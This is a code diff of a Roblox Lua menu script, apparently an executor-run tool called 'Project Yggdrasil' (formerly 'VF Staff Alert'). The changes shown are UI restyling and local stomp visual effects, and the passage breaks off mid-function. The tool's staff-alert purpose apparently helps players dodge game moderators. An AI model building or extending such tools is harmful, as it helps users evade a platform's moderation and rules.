@@ -524,6 +1101,7 @@ topbarLine.BackgroundTransparency = 0.6
 topbarLine.Position = UDim2.new(0, 0, 1, -1)
 topbarLine.Size = UDim2.new(1, 0, 0, 1)
 topbarLine.ZIndex = 6
+addGradient(topbarLine, theme.AccentPrimary, theme.AccentSecondary, 0)
 
 local sideLogo = Instance.new("Frame", topbar)
 sideLogo.BackgroundColor3 = theme.AccentSecondary
@@ -561,26 +1139,198 @@ end)
 local sideTitle = Instance.new("TextLabel", topbar)
 sideTitle.BackgroundTransparency = 1
 sideTitle.Position = UDim2.new(0, 55, 0, 12)
-sideTitle.Size = UDim2.new(0, 108, 0, 30)
+sideTitle.Size = UDim2.new(0, 128, 0, 30)
 sideTitle.Font = Enum.Font.GothamBold
 -- xx MENU NAME
-sideTitle.Text = "VF STAFF ALERT"
+sideTitle.Text = "PROJECT YGGDRASIL"
 sideTitle.TextColor3 = theme.TextPrimary
-sideTitle.TextSize = 13
+sideTitle.TextSize = 12
 sideTitle.TextXAlignment = Enum.TextXAlignment.Left
 sideTitle.ZIndex = 6
+local sideTitleGradient = Instance.new("UIGradient", sideTitle)
+sideTitleGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 225, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(175, 130, 255))
+})
+sideTitleGradient.Offset = Vector2.new(-1, 0)
+
 local topAnnouncement = Instance.new("TextLabel", topbar)
 topAnnouncement.BackgroundTransparency = 1
-topAnnouncement.Position = UDim2.new(0, 170, 0, 0)
-topAnnouncement.Size = UDim2.new(1, -130, 1, 0)
+topAnnouncement.Position = UDim2.new(0, 190, 0, 0)
+topAnnouncement.Size = UDim2.new(1, -310, 1, 0)
 topAnnouncement.Font = Enum.Font.GothamBold
 --xx Updated:                                                          --
-topAnnouncement.Text = "FREE EDITION | Premium version available"
-topAnnouncement.TextColor3 = theme.TextSecondary
-topAnnouncement.TextSize = 17
+topAnnouncement.Text = "STAFF ALERT  ◆  GET PREMIUM"
+topAnnouncement.TextColor3 = theme.TextPrimary
+topAnnouncement.TextSize = 15
 topAnnouncement.TextXAlignment = Enum.TextXAlignment.Left
 topAnnouncement.TextYAlignment = Enum.TextYAlignment.Center
 topAnnouncement.ZIndex = 6
+state.TopAnnouncementGradient = Instance.new("UIGradient", topAnnouncement)
+state.TopAnnouncementGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 225, 255)),
+    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(0.72, Color3.fromRGB(105, 255, 155)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 220, 130)),
+})
+state.TopAnnouncementGradient.Offset = Vector2.new(-1, 0)
+
+-- Header signal core: a compact reactive equalizer that gives the top bar
+-- its own intelligence-console identity without competing with the title.
+state.HeaderSignal = Instance.new("Frame", topbar)
+state.HeaderSignal.BackgroundTransparency = 1
+state.HeaderSignal.Position = UDim2.new(1, -294, 0, 18)
+state.HeaderSignal.Size = UDim2.new(0, 76, 0, 20)
+state.HeaderSignal.ZIndex = 5
+state.HeaderBars = {}
+for index = 1, 7 do
+    local bar = Instance.new("Frame", state.HeaderSignal)
+    bar.BackgroundColor3 = index % 2 == 0
+        and Color3.fromRGB(105, 255, 155)
+        or Color3.fromRGB(100, 220, 255)
+    bar.BackgroundTransparency = 0.18
+    bar.BorderSizePixel = 0
+    bar.Position = UDim2.new(0, (index - 1) * 10 + 2, 0.5, -4)
+    bar.Size = UDim2.new(0, 4, 0, 8)
+    bar.ZIndex = 5
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+    table.insert(state.HeaderBars, bar)
+end
+state.HeaderSignalLine = Instance.new("Frame", state.HeaderSignal)
+state.HeaderSignalLine.BackgroundColor3 = Color3.fromRGB(120, 225, 255)
+state.HeaderSignalLine.BackgroundTransparency = 0.65
+state.HeaderSignalLine.BorderSizePixel = 0
+state.HeaderSignalLine.Position = UDim2.new(0, 2, 1, -1)
+state.HeaderSignalLine.Size = UDim2.new(0, 70, 0, 1)
+state.HeaderSignalLine.ZIndex = 5
+task.spawn(function()
+    while topbar and topbar.Parent do
+        state.TopAnnouncementGradient.Offset = Vector2.new(-1, 0)
+        tween(
+            state.TopAnnouncementGradient,
+            {Offset = Vector2.new(1, 0)},
+            2.8,
+            Enum.EasingStyle.Linear
+        )
+        for index, bar in ipairs(state.HeaderBars) do
+            local height = 5 + ((index * 7) % 13)
+            tween(
+                bar,
+                {
+                    Size = UDim2.new(0, 4, 0, height),
+                    Position = UDim2.new(0, (index - 1) * 10 + 2, 0.5, -height / 2),
+                    BackgroundTransparency = 0.05,
+                },
+                0.22,
+                Enum.EasingStyle.Quad,
+                Enum.EasingDirection.Out
+            )
+            task.wait(0.08)
+        end
+        for index, bar in ipairs(state.HeaderBars) do
+            local height = 5 + (((index + 3) * 5) % 13)
+            tween(
+                bar,
+                {
+                    Size = UDim2.new(0, 4, 0, height),
+                    Position = UDim2.new(0, (index - 1) * 10 + 2, 0.5, -height / 2),
+                },
+                0.22,
+                Enum.EasingStyle.Quad,
+                Enum.EasingDirection.InOut
+            )
+        end
+        task.wait(2.4)
+    end
+end)
+
+state.EditionBadge = Instance.new("TextLabel", topbar)
+state.EditionBadge.BackgroundTransparency = is01Staff(localPlayer) and 1 or 0.08
+state.EditionBadge.BackgroundColor3 = isOwner(localPlayer)
+    and Color3.fromRGB(245, 225, 45)
+    or theme.BackgroundTertiary
+state.EditionBadge.Position = is01Staff(localPlayer)
+    and UDim2.new(1, -128, 0, 12)
+    or UDim2.new(1, -116, 0, 13)
+state.EditionBadge.Size = is01Staff(localPlayer)
+    and UDim2.new(0, 128, 0, 30)
+    or UDim2.new(0, 101, 0, 29)
+state.EditionBadge.Font = Enum.Font.GothamBold
+state.EditionBadge.Text = isOwner(localPlayer)
+    and "OVERSEER"
+    or (is01Staff(localPlayer) and "01 STAFF" or "FREE")
+state.EditionBadge.TextColor3 = is01Staff(localPlayer)
+    and theme.TextPrimary
+    or theme.TextPrimary
+state.EditionBadge.TextStrokeTransparency = 1
+state.EditionBadge.TextSize = is01Staff(localPlayer) and 12 or 11
+state.EditionBadge.TextXAlignment = is01Staff(localPlayer)
+    and Enum.TextXAlignment.Right
+    or Enum.TextXAlignment.Center
+state.EditionBadge.ZIndex = is01Staff(localPlayer) and 6 or 8
+Instance.new("UICorner", state.EditionBadge).CornerRadius = UDim.new(1, 0)
+state.EditionBadgeStroke = Instance.new("UIStroke", state.EditionBadge)
+state.EditionBadgeStroke.Color = Color3.fromRGB(225, 235, 255)
+state.EditionBadgeStroke.Thickness = 1
+state.EditionBadgeStroke.Transparency = 0.15
+state.EditionBadgeStroke.Enabled = not is01Staff(localPlayer)
+local badgeGradient = Instance.new("UIGradient", state.EditionBadge)
+badgeGradient.Color = isOwner(localPlayer)
+    and ColorSequence.new(
+        Color3.fromRGB(255, 245, 65),
+        Color3.fromRGB(255, 255, 220),
+        Color3.fromRGB(205, 220, 35)
+    )
+    or (is01Staff(localPlayer) and ColorSequence.new({
+         ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 225, 255)),
+         ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+         ColorSequenceKeypoint.new(1, Color3.fromRGB(175, 130, 255))
+     }) or ColorSequence.new(Color3.fromRGB(255, 255, 255)))
+badgeGradient.Enabled = true
+badgeGradient.Offset = Vector2.new(-1, 0)
+task.spawn(function()
+    while state.EditionBadge.Parent do
+        badgeGradient.Offset = Vector2.new(-1, 0)
+        tween(
+            badgeGradient,
+            {Offset = Vector2.new(1, 0)},
+            is01Staff(localPlayer) and 2.2 or 2.4,
+            Enum.EasingStyle.Linear
+        )
+        task.wait(is01Staff(localPlayer) and 5.2 or 3.2)
+    end
+end)
+
+local topbarGlint = Instance.new("Frame", topbar)
+topbarGlint.BackgroundColor3 = Color3.fromRGB(115, 235, 255)
+topbarGlint.BackgroundTransparency = 0.35
+topbarGlint.BorderSizePixel = 0
+topbarGlint.Position = UDim2.new(0, -70, 0, 0)
+topbarGlint.Size = UDim2.new(0, 70, 0, 2)
+topbarGlint.ZIndex = 7
+local topbarGlintGradient = Instance.new("UIGradient", topbarGlint)
+topbarGlintGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 210, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 100, 255))
+})
+topbarGlintGradient.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 1),
+    NumberSequenceKeypoint.new(0.5, 0),
+    NumberSequenceKeypoint.new(1, 1)
+})
+
+task.spawn(function()
+    task.wait(1.2)
+    while topbar and topbar.Parent do
+        topbarGlint.Position = UDim2.new(0, -70, 0, 1)
+        tween(topbarGlint, {Position = UDim2.new(1, 0, 0, 1)}, 2.2, Enum.EasingStyle.Linear)
+        sideTitleGradient.Offset = Vector2.new(-1, 0)
+        tween(sideTitleGradient, {Offset = Vector2.new(1, 0)}, 2.2, Enum.EasingStyle.Linear)
+        task.wait(5.2)
+    end
+end)
 
 -- Sidebar
 local sidebar = Instance.new("Frame", main)
@@ -595,10 +1345,35 @@ nav.BackgroundTransparency = 1
 nav.Position = UDim2.new(0, 0, 0, 10)
 nav.Size = UDim2.new(1, 0, 1, -10)
 
+state.SidebarFooterLine = Instance.new("Frame", sidebar)
+state.SidebarFooterLine.BackgroundColor3 = Color3.fromRGB(255, 195, 45)
+state.SidebarFooterLine.BackgroundTransparency = 0.65
+state.SidebarFooterLine.BorderSizePixel = 0
+state.SidebarFooterLine.Position = UDim2.new(0, 14, 1, -42)
+state.SidebarFooterLine.Size = UDim2.new(1, -28, 0, 1)
+
+state.SidebarFooter = Instance.new("TextLabel", sidebar)
+state.SidebarFooter.BackgroundTransparency = 1
+state.SidebarFooter.Position = UDim2.new(0, 14, 1, -35)
+state.SidebarFooter.Size = UDim2.new(1, -28, 0, 24)
+state.SidebarFooter.Font = Enum.Font.GothamBold
+state.SidebarFooter.Text = "◆  FREE ACCESS"
+state.SidebarFooter.TextColor3 = theme.TextPrimary
+state.SidebarFooter.TextSize = 15
+state.SidebarFooter.TextXAlignment = Enum.TextXAlignment.Center
+
 local pages = Instance.new("Frame", main)
 pages.BackgroundTransparency = 1
 pages.Position = UDim2.new(0, 150, 0, 55)
 pages.Size = UDim2.new(1, -150, 1, -55)
+
+local sidebarDivider = Instance.new("Frame", main)
+sidebarDivider.BackgroundColor3 = theme.AccentSecondary
+sidebarDivider.BackgroundTransparency = 0.15
+sidebarDivider.BorderSizePixel = 0
+sidebarDivider.Position = UDim2.new(0, 149, 0, 55)
+sidebarDivider.Size = UDim2.new(0, 2, 1, -55)
+addGradient(sidebarDivider, theme.AccentPrimary, theme.AccentSecondary, 90)
 
 local function createPage(name)
     local p = Instance.new("ScrollingFrame", pages)
@@ -607,14 +1382,29 @@ local function createPage(name)
     p.Position = UDim2.new(0, 15, 0, 20)
     p.Size = UDim2.new(1, -30, 1, -40)
     p.CanvasSize = UDim2.new(0, 0, 0, 500)
-    p.ScrollBarThickness = 0
+    p.ScrollBarThickness = 4
+    p.ScrollBarImageColor3 = theme.AccentSecondary
+    p.ScrollBarImageTransparency = 0.18
     p.Visible = false
+    local railColors = {
+        Profile = theme.AccentPrimary,
+        Staff = theme.AccentSteel,
+        Information = theme.AccentSecondary,
+    }
+    local rail = Instance.new("Frame", p)
+    rail.Name = "PageAccentRail"
+    rail.BackgroundColor3 = railColors[name] or theme.AccentSecondary
+    rail.BackgroundTransparency = 0.2
+    rail.BorderSizePixel = 0
+    rail.Position = UDim2.new(0, -7, 0, 4)
+    rail.Size = UDim2.new(0, 3, 0, 38)
+    Instance.new("UICorner", rail).CornerRadius = UDim.new(1, 0)
     return p
 end
 
+local profilePage    = createPage("Profile")
 local staffPage      = createPage("Staff")
 local infoPage       = createPage("Information")
-local targetPage     = createPage("Target")
 -- Staff List page: ScrollingFrame so the whole page scrolls like the other submenus.
 -- Each section also has its OWN inner ScrollingFrame for per-category scrolling.
 local staffListPage  = Instance.new("ScrollingFrame", pages)
@@ -629,56 +1419,102 @@ staffListPage.ScrollingDirection = Enum.ScrollingDirection.Y
 staffListPage.AutomaticCanvasSize = Enum.AutomaticSize.Y
 staffListPage.Visible  = false
 
-local currentPage = infoPage   -- opens on Info / Updates by default
+
+local currentPage = profilePage   -- opens on the account page by default
 currentPage.Visible = true
 
 local function navBtn(name, page, y)
+    local navColors = {
+        theme.AccentPrimary,
+        theme.AccentSecondary,
+        theme.AccentSteel,
+        theme.AccentPrimary,
+        theme.AccentSteel,
+        theme.AccentSecondary,
+        theme.AccentPrimary,
+        theme.AccentSecondary,
+    }
+    local navColor = navColors[(math.floor(y / 45) % #navColors) + 1]
     local b = Instance.new("TextButton", nav)
-    b.BackgroundColor3 = theme.BackgroundTertiary
-    b.BackgroundTransparency = 0.8
+    b.BackgroundColor3 = navColor
+    b.BackgroundTransparency = page == currentPage and 0.18 or 0.82
     b.Position = UDim2.new(0, 10, 0, y)
     b.Size = UDim2.new(1, -20, 0, 35)
     b.Font = Enum.Font.GothamMedium
     b.Text = name
-    b.TextColor3 = theme.TextSecondary
-    b.TextSize = 12
+    b.TextColor3 = page == currentPage and theme.TextPrimary or theme.TextSecondary
+    b.TextSize = 13
+    b.AutoButtonColor = false
     Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
 
     local s = Instance.new("UIStroke", b)
-    s.Color = theme.AccentSecondary
-    s.Thickness = 1
+    s.Color = navColor
+    s.Thickness = 2
     s.Enabled = (page == currentPage)
 
+    local activeBar = Instance.new("Frame", b)
+    activeBar.Name = "NavActiveBar"
+    activeBar.BackgroundColor3 = navColor
+    activeBar.BorderSizePixel = 0
+    activeBar.Position = UDim2.new(0, 0, 0.5, -9)
+    activeBar.Size = UDim2.new(0, 3, 0, 18)
+    activeBar.Visible = page == currentPage
+    Instance.new("UICorner", activeBar).CornerRadius = UDim.new(1, 0)
+
     b.MouseButton1Click:Connect(function()
+        tween(b, {BackgroundTransparency = 0.28}, 0.08, Enum.EasingStyle.Quad)
         currentPage.Visible = false
         for _, child in ipairs(nav:GetChildren()) do
             if child:IsA("TextButton") then
                 child:FindFirstChildOfClass("UIStroke").Enabled = false
+                local childBar = child:FindFirstChild("NavActiveBar")
+                if childBar then childBar.Visible = false end
             end
         end
         currentPage = page
         currentPage.Visible = true
         s.Enabled = true
+        activeBar.Visible = true
+        task.delay(0.12, function()
+            if b.Parent then
+                tween(b, {BackgroundTransparency = 0.48}, 0.18, Enum.EasingStyle.Quad)
+            end
+        end)
+    end)
+    b.MouseEnter:Connect(function()
+        tween(b, {BackgroundTransparency = 0.38}, 0.15, Enum.EasingStyle.Quad)
+    end)
+    b.MouseLeave:Connect(function()
+        tween(b, {BackgroundTransparency = page == currentPage and 0.18 or 0.82}, 0.2, Enum.EasingStyle.Quad)
     end)
 end
 
 -- SUBMENU
-navBtn("Info / Updates", infoPage, 0)
-navBtn("Staff Alerts", staffPage, 45)
-navBtn("Staff List", staffListPage, 90)
+navBtn("PROFILE", profilePage, 0)
+navBtn("INFORMATION", infoPage, 45)
+navBtn("STAFF ALERTS", staffPage, 90)
+navBtn("STAFF LIST", staffListPage, 135)
 
-local flingPage = createPage("Fling")
 
-local function createButton(name, desc, yPos, callback, parent)
+local function createButton(name, desc, yPos, callback, parent, accentOverride)
+    local buttonAccents = {theme.AccentPrimary, theme.AccentWarm, theme.AccentPink, theme.Success}
+    local accent = accentOverride or buttonAccents[(math.floor(yPos / 55) % #buttonAccents) + 1]
     local f = Instance.new("Frame", parent or staffPage)
     f.BackgroundColor3 = theme.BackgroundSecondary
     f.Position = UDim2.new(0, 0, 0, yPos)
     f.Size = UDim2.new(1, 0, 0, 55)
     Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
+    addGradient(f, theme.BackgroundSecondary, theme.BackgroundTertiary, 0)
     local s = Instance.new("UIStroke", f)
-    s.Color = theme.AccentSecondary
+    s.Color = accent
     s.Thickness = 2
     s.Transparency = 0.5
+    local accentBar = Instance.new("Frame", f)
+    accentBar.BackgroundColor3 = accent
+    accentBar.BorderSizePixel = 0
+    accentBar.Position = UDim2.new(0, 0, 0, 9)
+    accentBar.Size = UDim2.new(0, 3, 1, -18)
+    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)
 
     local tl = Instance.new("TextLabel", f)
     tl.BackgroundTransparency = 1
@@ -701,7 +1537,7 @@ local function createButton(name, desc, yPos, callback, parent)
     dl.TextXAlignment = Enum.TextXAlignment.Left
 
     local bg = Instance.new("Frame", f)
-    bg.BackgroundColor3 = theme.BackgroundTertiary
+    bg.BackgroundColor3 = accent
     bg.Position = UDim2.new(1, -80, 0.5, -14)
     bg.Size = UDim2.new(0, 70, 0, 28)
     Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
@@ -712,7 +1548,7 @@ local function createButton(name, desc, yPos, callback, parent)
     btnText.Font = Enum.Font.GothamBold
     btnText.Text = "RUN"
     btnText.TextColor3 = theme.TextPrimary
-    btnText.TextSize = 12
+    btnText.TextSize = 13
 
     local click = Instance.new("TextButton", f)
     click.BackgroundTransparency = 1
@@ -720,23 +1556,41 @@ local function createButton(name, desc, yPos, callback, parent)
     click.Text = ""
 
     click.MouseButton1Click:Connect(function()
-        tween(bg, {BackgroundColor3 = theme.AccentPrimary}, 0.1)
+        tween(bg, {BackgroundColor3 = theme.TextPrimary}, 0.1)
         task.wait(0.1)
-        tween(bg, {BackgroundColor3 = theme.BackgroundTertiary}, 0.1)
+        tween(bg, {BackgroundColor3 = accent}, 0.1)
         callback()
+    end)
+    click.MouseEnter:Connect(function()
+        tween(s, {Transparency = 0.15}, 0.15)
+        tween(bg, {BackgroundColor3 = theme.TextPrimary}, 0.15)
+    end)
+    click.MouseLeave:Connect(function()
+        tween(s, {Transparency = 0.5}, 0.2)
+        tween(bg, {BackgroundColor3 = accent}, 0.2)
     end)
 end
 
-local function createToggle(name, desc, yPos, initialValue, callback, parent)
+local function createToggle(name, desc, yPos, initialValue, callback, parent, onColor, offColor)
+    local enabledColor = onColor or theme.AccentPrimary
+    local disabledColor = offColor or Color3.fromRGB(70, 59, 96)
     local f = Instance.new("Frame", parent or staffPage)
     f.BackgroundColor3 = theme.BackgroundSecondary
     f.Position = UDim2.new(0, 0, 0, yPos)
     f.Size = UDim2.new(1, 0, 0, 55)
     Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
+    addGradient(f, theme.BackgroundSecondary, theme.BackgroundTertiary, 0)
     local s = Instance.new("UIStroke", f)
-    s.Color = theme.AccentSecondary
+    s.Color = enabledColor
     s.Thickness = 2
     s.Transparency = initialValue and 0.2 or 0.8
+    local accentBar = Instance.new("Frame", f)
+    accentBar.BackgroundColor3 = enabledColor
+    accentBar.BackgroundTransparency = initialValue and 0 or 0.55
+    accentBar.BorderSizePixel = 0
+    accentBar.Position = UDim2.new(0, 0, 0, 9)
+    accentBar.Size = UDim2.new(0, 3, 1, -18)
+    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)
 
     local tl = Instance.new("TextLabel", f)
     tl.BackgroundTransparency = 1
@@ -758,74 +1612,1295 @@ local function createToggle(name, desc, yPos, initialValue, callback, parent)
     dl.TextSize = 12
     dl.TextXAlignment = Enum.TextXAlignment.Left
 
-    local bg = Instance.new("Frame", f)
-    bg.BackgroundColor3 = initialValue and theme.AccentPrimary or theme.BackgroundTertiary
-    bg.Position = UDim2.new(1, -62, 0.5, -14)
-    bg.Size = UDim2.new(0, 52, 0, 28)
-    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
+    local box = Instance.new("Frame", f)
+    box.BackgroundColor3 = initialValue and enabledColor or disabledColor
+    box.Position = UDim2.new(1, -48, 0.5, -14)
+    box.Size = UDim2.new(0, 28, 0, 28)
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 7)
 
-    local btn = Instance.new("Frame", bg)
-    btn.BackgroundColor3 = theme.TextPrimary
-    btn.Position = initialValue and UDim2.new(1, -25, 0.5, -11) or UDim2.new(0, 3, 0.5, -11)
-    btn.Size = UDim2.new(0, 22, 0, 22)
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
-    addGlow(btn, theme.TextPrimary, 0.6)
+    local check = Instance.new("TextLabel", box)
+    check.BackgroundTransparency = 1
+    check.Size = UDim2.new(1, 0, 1, 0)
+    check.Font = Enum.Font.GothamBold
+    check.Text = initialValue and "✓" or ""
+    check.TextColor3 = theme.TextPrimary
+    check.TextSize = 19
 
     local val = initialValue
+    local control = {}
+    local function render(value)
+        val = value
+        check.Text = value and "✓" or ""
+        tween(box, {BackgroundColor3 = value and enabledColor or disabledColor}, 0.2)
+        tween(s, {Transparency = value and 0.2 or 0.8}, 0.3)
+        tween(accentBar, {BackgroundColor3 = value and enabledColor or disabledColor}, 0.2)
+        tween(accentBar, {BackgroundTransparency = value and 0 or 0.55}, 0.2)
+    end
+    function control.SetValue(value, invokeCallback)
+        render(value)
+        if invokeCallback then callback(value) end
+    end
+    function control.GetValue()
+        return val
+    end
+
     local click = Instance.new("TextButton", f)
     click.BackgroundTransparency = 1
     click.Size = UDim2.new(1, 0, 1, 0)
     click.Text = ""
 
     click.MouseButton1Click:Connect(function()
-        val = not val
-        callback(val)
-        if val then
-            tween(btn, {Position = UDim2.new(1, -25, 0.5, -11)}, 0.3, Enum.EasingStyle.Back)
-            tween(bg, {BackgroundColor3 = theme.AccentPrimary}, 0.3)
-            tween(s, {Transparency = 0.2}, 0.3)
-        else
-            tween(btn, {Position = UDim2.new(0, 3, 0.5, -11)}, 0.3, Enum.EasingStyle.Back)
-            tween(bg, {BackgroundColor3 = theme.BackgroundTertiary}, 0.3)
-            tween(s, {Transparency = 0.8}, 0.3)
+        control.SetValue(not val, true)
+    end)
+    click.MouseEnter:Connect(function()
+        tween(s, {Transparency = 0.08}, 0.15)
+        tween(f, {BackgroundColor3 = Color3.fromRGB(30, 36, 58)}, 0.15)
+    end)
+    click.MouseLeave:Connect(function()
+        tween(s, {Transparency = val and 0.2 or 0.8}, 0.2)
+        tween(f, {BackgroundColor3 = theme.BackgroundSecondary}, 0.2)
+    end)
+    return control
+end
+
+-- Overseer stomp presentation. Every client running this script observes the
+-- Overseer's replicated character state and renders Yggdrasil locally.
+local stompEffects = {
+    CharacterConnection = nil,
+    PlayerAddedConnection = nil,
+    PlayerRemovingConnection = nil,
+    SourcePlayer = nil,
+    InputConnection = nil,
+    Connections = {},
+    PendingStomp = nil,
+    Generation = 0,
+    LastEffectAt = 0,
+}
+
+local STOMP_ANIMATION_IDS = {
+    ["2788306498"] = true,
+    ["2788838708"] = true,
+}
+
+local STOMP_STATE_NAMES = {
+    stomp = true,
+    stomping = true,
+    stompactive = true,
+    stompstarted = true,
+    attacking = true,
+}
+
+function stompEffects.DestroyLater(instance, delaySeconds)
+    task.delay(delaySeconds, function()
+        if instance and instance.Parent then
+            instance:Destroy()
         end
     end)
 end
 
+function stompEffects.CreateDisc(position, color, startDiameter, endDiameter, lifetime, transparency)
+    local disc = Instance.new("Part")
+    disc.Name = "FreeStompEffect"
+    disc.Anchored = true
+    disc.CanCollide = false
+    disc.CanQuery = false
+    disc.CanTouch = false
+    disc.CastShadow = false
+    disc.Material = Enum.Material.Neon
+    disc.Shape = Enum.PartType.Cylinder
+    disc.Color = color
+    disc.Transparency = transparency
+    disc.Size = Vector3.new(0.06, startDiameter, startDiameter)
+    disc.CFrame = CFrame.new(position + Vector3.new(0, 0.04, 0))
+        * CFrame.Angles(0, 0, math.rad(90))
+    disc.Parent = Workspace
+
+    TweenService:Create(
+        disc,
+        TweenInfo.new(lifetime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {
+            Size = Vector3.new(0.03, endDiameter, endDiameter),
+            Transparency = 1,
+        }
+    ):Play()
+    stompEffects.DestroyLater(disc, lifetime + 0.1)
+end
+
+function stompEffects.IsEnabled()
+    -- Only an explicit Profile toggle-off disables the effect. A fresh script
+    -- execution always starts enabled and never loads a saved opt-out.
+    return config.OverseerStompEffectsEnabled ~= false
+end
+
+function stompEffects.ClearConnections()
+    if stompEffects.InputConnection then
+        stompEffects.InputConnection:Disconnect()
+        stompEffects.InputConnection = nil
+    end
+    for _, connection in ipairs(stompEffects.Connections) do
+        pcall(function()
+            connection:Disconnect()
+        end)
+    end
+    table.clear(stompEffects.Connections)
+    stompEffects.CancelPending()
+end
+
+function stompEffects.ShowScreenBurst(color, startTransparency, lifetime)
+    local flashGui = Instance.new("ScreenGui")
+    flashGui.Name = "FreeStompScreenBurst"
+    flashGui.IgnoreGuiInset = true
+    flashGui.DisplayOrder = 999998
+    flashGui.ResetOnSpawn = false
+    flashGui.Parent = CoreGui.RobloxGui
+
+    local flash = Instance.new("Frame")
+    flash.BorderSizePixel = 0
+    flash.BackgroundColor3 = color
+    flash.BackgroundTransparency = startTransparency
+    flash.Size = UDim2.fromScale(1, 1)
+    flash.Parent = flashGui
+
+    TweenService:Create(
+        flash,
+        TweenInfo.new(lifetime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 1}
+    ):Play()
+    stompEffects.DestroyLater(flashGui, lifetime + 0.08)
+end
+
+function stompEffects.CreateBurstPart(position, color, startSize, endSize, lifetime, startTransparency)
+    local burst = Instance.new("Part")
+    burst.Name = "FreeStompBurstSphere"
+    burst.Anchored = true
+    burst.CanCollide = false
+    burst.CanQuery = false
+    burst.CanTouch = false
+    burst.CastShadow = false
+    burst.Material = Enum.Material.Neon
+    burst.Shape = Enum.PartType.Ball
+    burst.Color = color
+    burst.Transparency = startTransparency
+    burst.Size = Vector3.new(startSize, startSize, startSize)
+    burst.Position = position + Vector3.new(0, 0.6, 0)
+    burst.Parent = Workspace
+    TweenService:Create(
+        burst,
+        TweenInfo.new(lifetime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {
+            Size = Vector3.new(endSize, endSize, endSize),
+            Transparency = 1,
+        }
+    ):Play()
+    stompEffects.DestroyLater(burst, lifetime + 0.08)
+end
+
+function stompEffects.EmitParticles(anchor, firstColor, secondColor, amount, speed, lifetime)
+    local particles = Instance.new("ParticleEmitter")
+    particles.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+    particles.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, firstColor),
+        ColorSequenceKeypoint.new(1, secondColor),
+    })
+    particles.LightEmission = 1
+    particles.Lifetime = lifetime
+    particles.Speed = speed
+    particles.SpreadAngle = Vector2.new(180, 30)
+    particles.Drag = 7
+    particles.Rate = 0
+    particles.Rotation = NumberRange.new(0, 360)
+    particles.RotSpeed = NumberRange.new(-180, 180)
+    particles.Size = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 0.55),
+        NumberSequenceKeypoint.new(1, 0),
+    })
+    particles.Parent = anchor
+    particles:Emit(amount)
+end
+
+function stompEffects.CreateLine(parent, fromPosition, toPosition, color, width, transparency)
+    local distance = (toPosition - fromPosition).Magnitude
+    if distance <= 0.01 then return nil end
+
+    local line = Instance.new("Part")
+    line.Name = "StompEnergyLine"
+    line.Anchored = true
+    line.CanCollide = false
+    line.CanQuery = false
+    line.CanTouch = false
+    line.CastShadow = false
+    line.Material = Enum.Material.Neon
+    line.Color = color
+    line.Transparency = transparency or 0
+    line.Size = Vector3.new(width, width, distance)
+    line.CFrame = CFrame.lookAt(fromPosition, toPosition) * CFrame.new(0, 0, -distance / 2)
+    line.Parent = parent
+    return line
+end
+
+function stompEffects.CreateOrb(parent, position, color, size, transparency)
+    local orb = Instance.new("Part")
+    orb.Name = "StompEnergyOrb"
+    orb.Anchored = true
+    orb.CanCollide = false
+    orb.CanQuery = false
+    orb.CanTouch = false
+    orb.CastShadow = false
+    orb.Material = Enum.Material.Neon
+    orb.Shape = Enum.PartType.Ball
+    orb.Color = color
+    orb.Transparency = transparency or 0.15
+    orb.Size = Vector3.new(size, size, size)
+    orb.Position = position
+    orb.Parent = parent
+    return orb
+end
+
+function stompEffects.AddPostEffects(name, tint, brightness, contrast, blurSize, lifetime)
+    local lighting = game:GetService("Lighting")
+
+    local color = Instance.new("ColorCorrectionEffect")
+    color.Name = name .. "Color"
+    color.TintColor = Color3.new(1, 1, 1)
+    color.Brightness = 0
+    color.Contrast = 0
+    color.Saturation = 0
+    color.Parent = lighting
+
+    local bloom = Instance.new("BloomEffect")
+    bloom.Name = name .. "Bloom"
+    bloom.Intensity = 0
+    bloom.Size = 42
+    bloom.Threshold = 0.75
+    bloom.Parent = lighting
+
+    local blur = Instance.new("BlurEffect")
+    blur.Name = name .. "Blur"
+    blur.Size = 0
+    blur.Parent = lighting
+
+    TweenService:Create(color, TweenInfo.new(0.45), {
+        TintColor = tint,
+        Brightness = brightness,
+        Contrast = contrast,
+        Saturation = 0.12,
+    }):Play()
+    TweenService:Create(bloom, TweenInfo.new(0.35), {Intensity = 2.2}):Play()
+    TweenService:Create(blur, TweenInfo.new(0.18), {Size = blurSize}):Play()
+    task.delay(0.18, function()
+        if blur.Parent then
+            TweenService:Create(blur, TweenInfo.new(0.65), {Size = 0}):Play()
+        end
+    end)
+
+    task.delay(lifetime - 1, function()
+        if color.Parent then
+            TweenService:Create(color, TweenInfo.new(1), {
+                TintColor = Color3.new(1, 1, 1),
+                Brightness = 0,
+                Contrast = 0,
+                Saturation = 0,
+            }):Play()
+        end
+        if bloom.Parent then
